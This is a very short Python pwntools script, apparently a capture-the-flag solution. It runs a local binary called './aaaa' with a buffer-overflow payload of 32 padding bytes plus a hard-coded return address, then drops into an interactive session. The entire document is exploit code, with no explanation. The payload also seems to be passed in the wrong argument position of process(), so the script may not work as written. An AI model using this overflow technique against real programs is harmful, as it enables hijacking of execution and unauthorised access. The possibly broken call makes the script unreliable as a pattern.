from pwn import*

p=process("./aaaa", b"a"*32 + p32(0x08048370))

p.interactive()
